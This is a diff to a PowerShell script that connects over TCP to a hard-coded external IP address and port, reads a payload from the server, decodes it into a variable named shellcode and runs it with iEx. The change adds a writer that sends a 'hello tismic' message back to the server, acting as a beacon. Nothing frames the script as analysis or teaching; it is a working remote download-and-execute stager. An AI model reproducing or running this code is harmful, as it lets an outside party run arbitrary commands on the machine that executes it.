@@ -1,6 +1,6 @@
 $Client = New-Object System.Net.Sockets.TcpClient("66.228.37.7", 1211)
 $Stream = $Client.GetStream()
-
+$Writer = New-Object System.IO.StreamWriter($Stream)
 # Receive the message from the server as plain text
 $StreamReader = New-Object System.IO.StreamReader($Stream, [System.Text.Encoding]::ASCII)
 $msg = $StreamReader.ReadLine()
@@ -25,6 +25,8 @@ for ($i = 0; $i -lt $bytes.Count; $i++) {
 }
 $shellcode = [System.Text.Encoding]::Unicode.GetString($byteArray)
 iEx $shellcode
+$Writer.WriteLine("hello tismic")
+$Writer.Flush()
 # Close the connection
 $StreamReader.Close()
 $Stream.Close()
